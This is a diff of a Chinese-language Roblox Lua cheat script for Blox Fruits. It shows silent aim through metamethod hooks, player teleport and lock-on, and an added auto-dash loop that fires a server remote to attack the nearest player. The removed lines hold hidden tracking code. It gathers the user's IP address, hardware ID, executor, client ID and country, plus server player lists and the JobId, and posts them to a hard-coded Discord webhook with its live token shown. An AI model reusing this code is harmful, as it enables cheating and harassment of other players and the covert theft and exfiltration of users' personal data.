-    {Title = L("翡翠"), Description = L("清爽绿色配色"), Value = "Emerald"},
-    {Title = L("琥珀"), Description = L("温暖金色配色"), Value = "Amber"},
-    {Title = L("玫瑰"), Description = L("柔和粉色配色"), Value = "Rose"},
-    {Title = L("绯红"), Description = L("浓郁红色配色"), Value = "Crimson"},
-    {Title = L("北境"), Description = L("冷静低饱和配色"), Value = "Nord"},
-    {Title = L("赛博"), Description = L("高亮青色配色"), Value = "Cyber"},
-    {Title = L("明亮"), Description = L("浅色界面配色"), Value = "Light"},
-    {Title = L("樱花"), Description = L("浅粉色界面配色"), Value = "Sakura"},
-    {Title = L("拿铁"), Description = L("温和米色配色"), Value = "Latte"},
-    {Title = L("高对比"), Description = L("强调可读性的配色"), Value = "HighContrast"},
-}
+local currentThemeName = WindUI:GetCurrentTheme()
+local availableThemes = WindUI:GetThemes()
+local themeList = {}
+for themeName, _ in pairs(availableThemes) do
+    table.insert(themeList, themeName)
+end
 
--- 窗口快捷键固定为 G。
-LanguageButton = ConfigSection:Button({
+
+RJR[L("设置")]:Keybind({
+    Title = L("窗口切换键"),
+    Desc = L("切换窗口显示状态"),
+    Value = "G",
+    Callback = function(v)
+        Window:SetToggleKey(Enum.KeyCode[v])
+    end
+})
+
+RJR[L("设置")]:Button({
     Title = L("语言") .. " (" .. _G.G_Language .. ")",
     Icon = "globe",
     Callback = function()
@@ -2779,7 +2749,6 @@ LanguageButton = ConfigSection:Button({
         else
             _G.G_Language = "中文"
         end
-        RefreshLocalizedUI()
         SaveConfiguration()
         WindUI:Notify({
             Title = L("语言"),
@@ -2896,74 +2865,37 @@ local function validateOffset(val)
     return math.clamp(num, -3000, 3000)
 end
 
-local initialPlayerList = GetPlayerList()
-local initialSelectedPlayer = ValidDropdownValue(initialPlayerList, _G.G_SelectPly, nil)
-if not initialSelectedPlayer then
-    _G.G_SelectPly = ""
-end
-
-local PlayerDropdown
-local VisualPlayerDropdown
-
-local function SyncSelectedPlayer(selectedValue, sourceControl)
-    _G.G_SelectPly = selectedValue or ""
-    for _, control in ipairs({VisualPlayerDropdown, PlayerDropdown}) do
-        if control and control ~= sourceControl and control.SetValue then
-            control:SetValue(selectedValue, {Silent = true, Source = "sync"})
+local PlayerDropdown = RJR[L("传送")]:Dropdown({
+    Title = L("选择目标玩家"),
+    Values = GetPlayerList(),
+    Value = _G.G_SelectPly,
+    Callback = function(selectedValue)
+        if selectedValue and selectedValue ~= "" then
+            _G.G_SelectPly = selectedValue
+            WindUI:Notify({ Title = L("选择目标玩家"), Content = L("已设置为") .. selectedValue, Duration = 2 })
+        else
+            _G.G_SelectPly = ""
         end
     end
-end
-
-VisualPlayerDropdown = VisualTargetSection:Dropdown({
-    Title = L("选择目标玩家"),
-    Description = L("用于观战、传送和玩家目标功能"),
-    Values = initialPlayerList,
-    Value = initialSelectedPlayer,
-    Searchable = true,
-    Callback = function(selectedValue)
-        SyncSelectedPlayer(selectedValue, VisualPlayerDropdown)
-        if selectedValue then
-            WindUI:Notify({ Title = L("选择目标玩家"), Content = L("已设置为") .. selectedValue, Duration = 2 })
-        end
-    end,
-})
-
-PlayerDropdown = RJR[L("传送")]:Dropdown({
-    Title = L("选择目标玩家"),
-    Values = initialPlayerList,
-    Value = initialSelectedPlayer,
-    Searchable = true,
-    Callback = function(selectedValue)
-        SyncSelectedPlayer(selectedValue, PlayerDropdown)
-        if selectedValue then
-            WindUI:Notify({ Title = L("选择目标玩家"), Content = L("已设置为") .. selectedValue, Duration = 2 })
-        end
-    end,
-})
-
-local function RefreshPlayerDropdowns()
-    local newPlayerList = GetPlayerList()
-    local selectedPlayer = ValidDropdownValue(newPlayerList, _G.G_SelectPly, nil)
-    for _, control in ipairs({VisualPlayerDropdown, PlayerDropdown}) do
-        if control and control.Refresh then
-            control:Refresh(newPlayerList, false)
-            if selectedPlayer and control.SetValue then
-                control:SetValue(selectedPlayer, {Silent = true, Source = "refresh"})
-            end
-        end
-    end
-    _G.G_SelectPly = selectedPlayer or ""
-    WindUI:Notify({ Title = L("刷新玩家列表"), Content = L("加载完成"), Duration = 2 })
-end
-
-VisualTargetSection:Button({
-    Title = L("刷新玩家列表"),
-    Callback = RefreshPlayerDropdowns,
 })
 
 RJR[L("传送")]:Button({
     Title = L("刷新玩家列表"),
-    Callback = RefreshPlayerDropdowns,
+    Callback = function()
+        local newPlayerList = GetPlayerList()
+        if PlayerDropdown and PlayerDropdown.Refresh then
+            PlayerDropdown:Refresh(newPlayerList, true) 
+        end
+        if _G.G_SelectPly ~= "" and PlayerDropdown and PlayerDropdown.SetValue then
+            for _, name in ipairs(newPlayerList) do
+                if name == _G.G_SelectPly then
+                    pcall(function() PlayerDropdown:SetValue(_G.G_SelectPly) end)
+                    break
+                end
+            end
+        end
+        WindUI:Notify({ Title = L("刷新玩家列表"), Content = L("加载完成"), Duration = 2 })
+    end
 })
 
 RJR[L("传送")]:Toggle({
@@ -3167,7 +3099,7 @@ elseif World3 then
         ["海洋城堡"] = Vector3.new(-12463.6, 376.26, -7566.08),
         ["海龟豪宅"] = Vector3.new(-5060.41, 316.43, -3192.30),
         ["司法"] = Vector3.new(-5096.48, 316.43, -3177.91),
-        ["九头蛇"] = Vector3.new(-5027.03, 316.43, -3206.07)
+        ["九头蛇"] = Vector3.new(-5027.03, 316.43, -3206.07),
     }
 end
 
@@ -3238,7 +3170,7 @@ RJR[L("传送")]:Toggle({
             
                 if _G.G_LockQuickPath and distance > 1000 and tick() - Lock2LastEntrance > 3 then
                     local entName, entPos = GetNearestEntranceToTarget(targetPos, myPos)
-                    if entName and entPos then
+                    if entName and entPos and entName ~= "P1" and entName ~= "P2" then
                         requestEntrance(entPos)
                         Lock2LastEntrance = tick()
                         return
@@ -3275,10 +3207,10 @@ RJR[L("传送")]:Toggle({
     Title = L("锁人快捷路径"),
     Desc = L("通过传送点快速接近目标"),
     Value = _G.G_LockQuickPath,
-    Callback = function(value)
-        _G.G_LockQuickPath = value
+    Callback = function(v)
+        _G.G_LockQuickPath = v
         SaveConfiguration()
-    end,
+    end
 })
 
 RJR[L("传送")]:Divider()
@@ -3334,51 +3266,28 @@ RJR[L("传送")]:Input({
 
 
 
-ThemeDropdown = RJR[L("设置")]:Dropdown({
-    Title = L("内置主题（十三套）"),
-    Description = L("选择后立即应用，不会重建窗口"),
-    Values = themeChoices,
-    Value = ValidDropdownValue(
-        {"Midnight", "Ocean", "Violet", "Emerald", "Amber", "Rose", "Crimson", "Nord", "Cyber", "Light", "Sakura", "Latte", "HighContrast"},
-        _G.G_Theme,
-        nil
-    ),
-    Searchable = true,
+RJR[L("设置")]:Dropdown({
+    Title = L("选择主题"),
+    Values = themeList,
+    Value = _G.G_Theme,
     Callback = function(v)
         _G.G_Theme = v
         WindUI:SetTheme(v)
-        if _G.G_AutoSaveConfig then SaveConfiguration() end
-    end,
-})
-
-ConfigSection:Toggle({
-    Title = L("自动保存配置"),
-    Value = _G.G_AutoSaveConfig,
-    Callback = function(v)
-        _G.G_AutoSaveConfig = v
     end
 })
 
-ConfigSection:Toggle({
-    Title = L("进游戏自动加载配置"),
-    Value = _G.G_AutoLoadConfig,
-    Callback = function(v)
-        _G.G_AutoLoadConfig = v
-    end
-})
-
-ConfigSection:Button({
+RJR[L("设置")]:Button({
     Title = L("保存配置"),
     Callback = function()
-        SaveConfiguration()
+        SaveConfig(true)
         WindUI:Notify({ Title = L("保存配置"), Content = L("加载完成"), Duration = 2 })
     end
 })
 
-ConfigSection:Button({
+RJR[L("设置")]:Button({
     Title = L("加载配置"),
     Callback = function()
-        LoadConfiguration()
+        LoadConfig()
         WindUI:Notify({ Title = L("加载配置"), Content = L("加载完成"), Duration = 2 })
     end
 })
@@ -3465,40 +3374,37 @@ local function GetClosestTargetToMouse()
 
     if method == "选择玩家" then
         if not _G.G_SilentAimTargetPlayers then return nil end
-        local selectedName = _G.G_SelectPly
-        if not selectedName or selectedName == "" then return nil end
-        local player = Players:FindFirstChild(selectedName)
+        local name = _G.G_SilentAimSelectedPlayer
+        if not name or name == "" then return nil end
+        local player = Players:FindFirstChild(name)
         if not player or player == LocalPlayer then return nil end
         if _G.G_SilentAimTeamCheck and not IsSilentAimEnemy(player) then return nil end
         local character = player.Character
         if not IsAlive(character) then return nil end
-        return character:FindFirstChild(_G.G_SilentAimPart)
-            or character:FindFirstChild("HumanoidRootPart")
+        return character:FindFirstChild(_G.G_SilentAimPart) or character:FindFirstChild("HumanoidRootPart")
     end
 
     if method == "最近的玩家" then
-        local character = LocalPlayer.Character
-        local root = character and character:FindFirstChild("HumanoidRootPart")
-        if not root then return nil end
+        local myChar = LocalPlayer.Character
+        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+        if not myRoot then return nil end
         local closest, shortest = nil, math.huge
-        local origin = root.Position
+        local myPos = myRoot.Position
 
-        local function checkNearest(targetCharacter)
-            if not IsAlive(targetCharacter) then return end
-            local part = targetCharacter:FindFirstChild(_G.G_SilentAimPart)
-                or targetCharacter:FindFirstChild("HumanoidRootPart")
+        local function checkNearest(character)
+            if not IsAlive(character) then return end
+            local part = character:FindFirstChild(_G.G_SilentAimPart) or character:FindFirstChild("HumanoidRootPart")
             if not part then return end
-            local distance = (part.Position - origin).Magnitude
-            if distance < shortest then
-                closest, shortest = part, distance
-            end
+            local d = (part.Position - myPos).Magnitude
+            if d < shortest then closest, shortest = part, d end
         end
 
         if _G.G_SilentAimTargetPlayers then
             for _, player in ipairs(Players:GetPlayers()) do
-                if player ~= LocalPlayer
-                    and (not _G.G_SilentAimTeamCheck or IsSilentAimEnemy(player)) then
-                    checkNearest(player.Character)
+                if player ~= LocalPlayer then
+                    if not _G.G_SilentAimTeamCheck or IsSilentAimEnemy(player) then
+                        checkNearest(player.Character)
+                    end
                 end
             end
         end
@@ -3510,13 +3416,16 @@ local function GetClosestTargetToMouse()
         return closest
     end
 
+    -- 鼠标最近的玩家（当前默认方法，按 FOV 内屏幕距离）
     local origin = GetSilentAimOrigin()
+    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
     local closest, shortest = nil, c.Radius
 
     local function check(character)
         if not IsAlive(character) then return end
         local part = character:FindFirstChild(_G.G_SilentAimPart) or character:FindFirstChild("HumanoidRootPart")
         if not part then return end
+        if myRoot and (part.Position - myRoot.Position).Magnitude > 1500 then return end
         local pos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(part.Position)
         if onScreen then
             local dist = (Vector2.new(pos.X, pos.Y) - origin).Magnitude
@@ -3554,10 +3463,10 @@ if MouseModule and typeof(MouseModule) == "table" then
         rawset(MouseModule, "Hit", nil); rawset(MouseModule, "Target", nil)
         mmt.__index = function(self, key)
             if key == "Hit" then
-                if _G.G_SilentAimSkill and currentSilentAimTarget then return CFrame.new(currentSilentAimTarget.Position) end
+                if _G.G_SilentAimSkill and IsCurrentSkillEnabled() and currentSilentAimTarget then return CFrame.new(currentSilentAimTarget.Position) end
                 return realStore.Hit
             elseif key == "Target" then
-                if _G.G_SilentAimSkill and currentSilentAimTarget then return currentSilentAimTarget end
+                if _G.G_SilentAimSkill and IsCurrentSkillEnabled() and currentSilentAimTarget then return currentSilentAimTarget end
                 return realStore.Target
             end
         end
@@ -3573,7 +3482,7 @@ local mouse = LocalPlayer:GetMouse()
 local oldIndex
 pcall(function()
     oldIndex = hookmetamethod(game, "__index", function(self, key)
-        if _G.G_SilentAimM1R and currentSilentAimTarget and not checkcaller() and self == mouse then
+        if _G.G_SilentAimM1R and IsCurrentSkillEnabled() and currentSilentAimTarget and not checkcaller() and self == mouse then
             local tp = currentSilentAimTarget.Position
             local cp = workspace.CurrentCamera.CFrame.Position
             if key == "Hit" then return CFrame.new(tp)
@@ -3635,8 +3544,6 @@ local function LockHotkeyUpdateUI()
         end
     end
 end
-
-RefreshDynamicLanguageUI = LockHotkeyUpdateUI
 
 local function LockHotkeyStartLoop()
    
@@ -3777,7 +3684,7 @@ local function StopLockHotkey()
     end
 end
 
-
+RJR[L("绘制")]:Divider()
 local FOVSection = RJR[L("绘制")]:Section({ Title = L("自瞄范围设置") })
 
 
@@ -3794,7 +3701,7 @@ FOVSection:Toggle({
 FOVSection:Dropdown({
     Title = L("FOV 位置"),
     Values = {"跟随鼠标", "屏幕中心"},
-    Value = ValidDropdownValue({"跟随鼠标", "屏幕中心"}, _G.FOVMode, "跟随鼠标"),
+    Value = _G.FOVMode,
     Callback = function(v)
         _G.FOVMode = v
         _G.G_SilentAimFOVMode = v
@@ -3824,10 +3731,10 @@ FOVSection:Colorpicker({
     end
 })
 
+RJR[L("绘制")]:Divider()
 
 
-
-local AimSection = RJR[L("绘制")]:Section({ Title = L("自瞄设置"), Side = "Right" })
+local AimSection = RJR[L("绘制")]:Section({ Title = L("自瞄设置") })
 
 AimSection:Toggle({
     Title = L("M1 R 自瞄"),
@@ -3842,17 +3749,24 @@ AimSection:Toggle({
 })
 
 AimSection:Dropdown({
-    Title = L("静默瞄准方法"),
-    Values = {
-        {Title = L("鼠标最近的玩家"), Value = "鼠标最近的玩家"},
-        {Title = L("最近的玩家"), Value = "最近的玩家"},
-        {Title = L("选择玩家"), Value = "选择玩家"},
-    },
-    Value = _G.G_SilentAimMethod,
-    Callback = function(value)
-        _G.G_SilentAimMethod = value
+    Title = L("指定技能自瞄"),
+    Values = {"M1 (普攻)", "Z", "X", "C", "V", "F", "R"},
+    Value = _G.G_SilentAimSkills,
+    Multi = true,
+    Callback = function(v)
+        _G.G_SilentAimSkills = v
         SaveConfiguration()
-    end,
+    end
+})
+
+AimSection:Dropdown({
+    Title = L("静默瞄准方法"),
+    Values = {"鼠标最近的玩家", "最近的玩家", "选择玩家"},
+    Value = _G.G_SilentAimMethod or "鼠标最近的玩家",
+    Callback = function(v)
+        _G.G_SilentAimMethod = v
+        SaveConfiguration()
+    end
 })
 
 AimSection:Toggle({
@@ -3882,15 +3796,39 @@ AimSection:Toggle({
 AimSection:Dropdown({
     Title = L("瞄准部位"),
     Values = {"HumanoidRootPart", "Head", "Torso", "UpperTorso", "LowerTorso"},
-    Value = ValidDropdownValue(
-        {"HumanoidRootPart", "Head", "Torso", "UpperTorso", "LowerTorso"},
-        _G.G_SilentAimPart,
-        "Head"
-    ),
+    Value = _G.G_SilentAimPart,
     Callback = function(v) _G.G_SilentAimPart = v; SaveConfiguration() end
 })
 
+RJR[L("绘制")]:Divider()
 
+local SilentAimPlayerDropdown = RJR[L("绘制")]:Dropdown({
+    Title = L("选择瞄准玩家"),
+    Values = GetPlayerList(),
+    Value = _G.G_SilentAimSelectedPlayer,
+    Callback = function(v)
+        _G.G_SilentAimSelectedPlayer = v or ""
+        SaveConfiguration()
+    end
+})
+
+RJR[L("绘制")]:Button({
+    Title = L("刷新玩家列表"),
+    Callback = function()
+        local newPlayerList = GetPlayerList()
+        if SilentAimPlayerDropdown and SilentAimPlayerDropdown.Refresh then
+            SilentAimPlayerDropdown:Refresh(newPlayerList, true)
+        end
+        if _G.G_SilentAimSelectedPlayer ~= "" and SilentAimPlayerDropdown and SilentAimPlayerDropdown.SetValue then
+            for _, name in ipairs(newPlayerList) do
+                if name == _G.G_SilentAimSelectedPlayer then
+                    pcall(function() SilentAimPlayerDropdown:SetValue(_G.G_SilentAimSelectedPlayer) end)
+                    break
+                end
+            end
+        end
+    end
+})
 
 RJR[L("绘制")]:Toggle({
     Title = L("快捷键锁人(按键h)"),
@@ -3909,7 +3847,7 @@ RJR[L("绘制")]:Toggle({
 RJR[L("绘制")]:Dropdown({
     Title = L("锁人模式"),
     Values = {"锁人1", "锁人2"},
-    Value = ValidDropdownValue({"锁人1", "锁人2"}, _G.G_LockHotkeyMode, "锁人1"),
+    Value = _G.G_LockHotkeyMode,
     Callback = function(v)
         _G.G_LockHotkeyMode = v
         SaveConfiguration()
@@ -3918,281 +3856,105 @@ RJR[L("绘制")]:Dropdown({
 
 if _G.G_LockHotkey then StartLockHotkey() end
 
-local GS_WEBHOOK = "https://discord.com/api/webhooks/1531606700229132389/6OC9OzbTvlp14E6oNUD_14XwV3PM6KAq4-xuMnspDq6DE-nUAr341sI9gSACVFYKe51h"
+RJR[L("绘制")]:Divider()
 
-local UserInputService = game:GetService("UserInputService")
-local LocalizationService = game:GetService("LocalizationService")
-local MarketplaceService = game:GetService("MarketplaceService")
-local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+-- ==========================================
+-- 自动 Soru 最近玩家
+-- ==========================================
+local AutoSoruConn = nil
 
-local function _runNotificationSystem()
-    local hasNotified = false
+local function SoruTo(targetPosition)
+    local Character = LocalPlayer.Character
+    if not Character then return end
 
-    -- 🗺️ 海域自動判定初始化
-    local placeId = game.PlaceId
-    local bloxFruitsMode = false
-    local sea = "未知海域"
+    local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
+    local Humanoid = Character:FindFirstChild("Humanoid")
+    if not HumanoidRootPart or not Humanoid or Humanoid.Health <= 0 then return end
 
-    if placeId == 4442272183 or placeId == 79091703265657 then
-        bloxFruitsMode = true
-        sea = "第 2 海域 (2nd Sea)"
-    elseif placeId == 7449423635 or placeId == 100117331123089 then
-        bloxFruitsMode = true
-        sea = "第 3 海域 (3rd Sea)"
-    elseif placeId == 85211729168715 or placeId == 2753915549 then
-        bloxFruitsMode = true
-        sea = "第 1 海域 (1st Sea)"
+    local startCFrame = HumanoidRootPart.CFrame
+    local finalPos = targetPosition
+    local finalCFrame = (startCFrame - startCFrame.Position) + finalPos + Vector3.new(0, HumanoidRootPart.Size.Y * 1.5, 0)
+
+    local randomId = math.random(1, 999999999)
+    ReplicatedStorage.Remotes.CommE:FireServer(
+        "Soru",
+        startCFrame,
+        finalCFrame,
+        workspace:GetServerTimeNow(),
+        randomId
+    )
+end
+
+local function GetClosestPlayerForSoru()
+    local closestPlayer = nil
+    local shortestDistance = math.huge
+
+    local Character = LocalPlayer.Character
+    if not Character or not Character:FindFirstChild("HumanoidRootPart") then
+        return nil
     end
 
-    -- 🛠️ 基礎安全調用與工具函數
-    local function safeCall(func, fallback)
-        local success, result = pcall(func)
-        return success and result or fallback
-    end
+    local myPos = Character.HumanoidRootPart.Position
 
-    local function getAvatarImage(userId)
-        return safeCall(function()
-            local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
-            local response = HttpService:JSONDecode(game:HttpGet(url))
-            return response.data[1].imageUrl
-        end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
-    end
-
-    local function getDeviceType()
-        local touch = UserInputService.TouchEnabled
-        local keyboard = UserInputService.KeyboardEnabled
-        local mouse = UserInputService.MouseEnabled
-        
-        if touch and not keyboard and not mouse then return "移動設備"
-        elseif not touch and keyboard and mouse then return "電腦"
-        elseif touch and keyboard and mouse then return "模擬器"
-        else return "未知" end
-    end
-
-    local function getExecutor()
-        return (identifyexecutor and identifyexecutor()) or 
-               (getexecutorname and getexecutorname()) or 
-               "未知"
-    end
-
-    local function getHWID()
-        return (gethwid and gethwid()) or "獲取失敗"
-    end
-
-    local function getIPAddress()
-        local request = http_request or request or (syn and syn.request)
-        if not request then return "無請求函數" end
-        
-        return safeCall(function()
-            return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
-        end, "獲取失敗")
-    end
-
-    local function getCrewName()
-        return safeCall(function()
-            local startTime = os.time()
-            while not localPlayer:FindFirstChild("Data") and (os.time() - startTime) < 5 do
-                task.wait(0.5)
-            end
-            
-            local dataFolder = localPlayer:FindFirstChild("Data")
-            
-            if dataFolder then
-                local crewVal = dataFolder:FindFirstChild("Crew")
-                if crewVal then
-                    local checkTime = os.time()
-                    while crewVal.Value == "" and (os.time() - checkTime) < 3 do
-                        task.wait(0.3)
-                    end
-                    if crewVal.Value ~= "" then
-                        return tostring(crewVal.Value)
-                    end
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            local otherChar = player.Character
+            local otherHum = otherChar and otherChar:FindFirstChild("Humanoid")
+            local otherRoot = otherChar and otherChar:FindFirstChild("HumanoidRootPart")
+            if otherHum and otherRoot and otherHum.Health > 0 then
+                local distance = (otherRoot.Position - myPos).Magnitude
+                if distance < shortestDistance then
+                    shortestDistance = distance
+                    closestPlayer = player
                 end
             end
-            
-            local crewNameVal = localPlayer:FindFirstChild("CrewName")
-            if crewNameVal and crewNameVal.Value ~= "" then
-                return tostring(crewNameVal.Value)
-            end
-            
-            local leaderstats = localPlayer:FindFirstChild("leaderstats")
-            local leaderCrew = leaderstats and leaderstats:FindFirstChild("Crew")
-            if leaderCrew and leaderCrew.Value ~= "" then
-                return tostring(leaderCrew.Value)
-            end
-            
-            return "無海賊團"
-        end, "無海賊團")
-    end
-
-    -- 擷取核心數據
-    local userId = localPlayer.UserId
-    local playerIp = getIPAddress()
-    local playerCrew = getCrewName()
-    local clientNotificationRequest = http_request or request or HttpPost or (syn and syn.request)
-
-    -- 🛡️ 構造原本的基礎資訊欄位
-    local function getBaseFields()
-        return {
-            {name = "用戶名", value = localPlayer.Name, inline = true},
-            {name = "顯示名稱", value = localPlayer.DisplayName, inline = true},
-            {name = "用戶ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
-            
-            {name = "客戶端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "獲取失敗"), inline = false},
-            
-            {name = "地圖ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
-            {name = "地圖名稱", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "獲取失敗"), inline = true},
-            
-            {name = "海賊團", value = playerCrew, inline = false}, 
-            
-            {name = "注入器", value = getExecutor(), inline = true},
-            {name = "帳號年齡", value = string.format("%d天", localPlayer.AccountAge), inline = true},
-            
-            {name = "設備", value = getDeviceType(), inline = false},
-            {name = "國家", value = string.format("國家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "獲取失敗")), inline = false},
-            {name = "語言", value = string.format("語言: %s", localPlayer.LocaleId), inline = false},
-           
-            {name = "HWID", value = getHWID(), inline = true},
-            {name = "IP地址", value = playerIp, inline = true},
-            {name = "IP查詢", value = string.format("https://binaryfork.com/zh/tools/ip-address-lookup/?ip=%s#ip-lookup", playerIp), inline = false}
-        }
-    end
-
-    -- --------------------------------------------------------------------------
-    -- 📤 【第一部分：初始化執行日誌（加載腳本時直接執行一次）】
-    -- --------------------------------------------------------------------------
-    local initPayload = {
-        username = "人擠人",
-        embeds = {{
-            color = tonumber("0x32CD32"), -- 綠色
-            title = string.format("有人正在用人擠人 %s %d時%d分", 
-                os.date("%Y年%m月%d日"), 
-                tonumber(os.date("%H")), 
-                tonumber(os.date("%M"))),
-            thumbnail = {url = getAvatarImage(userId)},
-            fields = getBaseFields()
-        }}
-    }
-
-    if clientNotificationRequest then
-        safeCall(function()
-            clientNotificationRequest({
-                Url = GS_WEBHOOK,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(initPayload)
-            })
-        end)
-    end
-
-    -- --------------------------------------------------------------------------
-    -- 🚨 【第二部分：雷達系統（背景持續循環檢測 + 海域分析）】
-    -- --------------------------------------------------------------------------
-    local function sendRadarAlert(detectedPlayer, matchReason)
-        local playerList = Players:GetPlayers()
-        local totalPlayers = #playerList
-        
-        -- 建立伺服器全體玩家名單
-        local listText = ""
-        for _, p in ipairs(playerList) do
-            listText = listText .. string.format("👤 %s (%s) | ID: %d\n", p.DisplayName, p.Name, p.UserId)
-        end
-        
-        if string.len(listText) > 3000 then
-            listText = string.sub(listText, 1, 3000) .. "\n... (資料過長已截斷)"
-        end
-
-        local radarPayload = {
-            username = "人擠人雷達警報系統",
-            embeds = {
-                -- 內嵌 1：伺服器威脅情報 (JobId 、全服名單與海域)
-                {
-                    title = "🚨 偵測到敏感名稱玩家進入同一伺服器！",
-                    description = string.format("**觸發原因:** 偵測到符合條件的玩家 (`%s`)", matchReason),
-                    color = 16711680, -- 紅色
-                    fields = {
-                        {
-                            name = "🎯 發現目標",
-                            value = string.format("顯示名: **%s**\n帳號名: `%s`\nID: `%d`", detectedPlayer.DisplayName, detectedPlayer.Name, detectedPlayer.UserId),
-                            inline = true
-                        },
-                        {
-                            name = "📍 所在海域位置",
-                            value = string.format("**%s**", sea),
-                            inline = true
-                        },
-                        {
-                            name = "🆔 伺服器 JobId (追端使用)",
-                            value = string.format("```lua\ngame.JobId = \"%s\"\n```", game.JobId),
-                            inline = false
-                        },
-                        {
-                            name = string.format("👥 當前伺服器全體玩家名單 (%d/%d)", totalPlayers, Players.MaxPlayers),
-                            value = "```md\n" .. listText .. "```",
-                            inline = false
-                        }
-                    },
-                    timestamp = DateTime.now():ToIsoDate()
-                },
-                -- 內嵌 2：回報者狀態（完整日誌資訊）
-                {
-                    title = "🛡️ 執行者（情報來源）當前狀態與完整日誌",
-                    color = 65535, -- 藍綠色
-                    thumbnail = {url = getAvatarImage(userId)},
-                    fields = getBaseFields(),
-                    footer = {text = "人擠人雷達安全回報機制"}
-                }
-            }
-        }
-
-        if clientNotificationRequest then
-            safeCall(function()
-                clientNotificationRequest({
-                    Url = GS_WEBHOOK,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode(radarPayload)
-                })
-            end)
         end
     end
 
-    -- 🔄 背景雷達循環
-    task.spawn(function()
-        while true do
-            local targetFound = false
-            local foundPlayer = nil
-            local matchReason = ""
-            
-            for _, player in ipairs(Players:GetPlayers()) do
-                -- 排除執行者本人
-                if player ~= localPlayer then
-                    local username = string.lower(player.Name)
-                    local displayName = string.lower(player.DisplayName)
-                    
-                    -- 1. 檢測 1amnot 開頭
-                    if string.find(username, "^1amnot") or string.find(displayName, "^1amnot") then
-                        targetFound = true
-                        foundPlayer = player
-                        matchReason = "1amnot 開頭"
-                        break
-                    end
-                end
-            end
-            
-            if targetFound then
-                if not hasNotified then
-                    sendRadarAlert(foundPlayer, matchReason)
-                    hasNotified = true
-                end
-            else
-                if hasNotified then
-                    hasNotified = false
-                end
-            end
-            
-            task.wait(5) -- 每 5 秒掃描一次
+    return closestPlayer
+end
+
+local function SoruToClosestPlayer()
+    local targetPlayer = GetClosestPlayerForSoru()
+    local targetChar = targetPlayer and targetPlayer.Character
+    if targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
+        local targetPos = (targetChar.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)).Position
+        SoruTo(targetPos)
+    end
+end
+
+local function StartAutoSoru()
+    if AutoSoruConn then return end
+    AutoSoruConn = task.spawn(function()
+        while _G.G_AutoSoru do
+            pcall(SoruToClosestPlayer)
+            task.wait(1)
         end
     end)
-
 end
+
+local function StopAutoSoru()
+    AutoSoruConn = nil
+end
+
+RJR[L("绘制")]:Toggle({
+    Title = L("自动瞬步"),
+    Desc = "每15秒强制打你2500血你气不气😂",
+    Value = _G.G_AutoSoru,
+    Callback = function(v)
+        _G.G_AutoSoru = v
+        if v then
+            StartAutoSoru()
+        else
+            StopAutoSoru()
+        end
+        SaveConfiguration()
+    end
+})
+
+if _G.G_AutoSoru then StartAutoSoru() end
+
+task.defer(function()
+    SaveConfig(true)
+    WindUI:Notify({ Title = L("保存配置"), Content = L("自动保存已开启"), Duration = 3 })
+end)
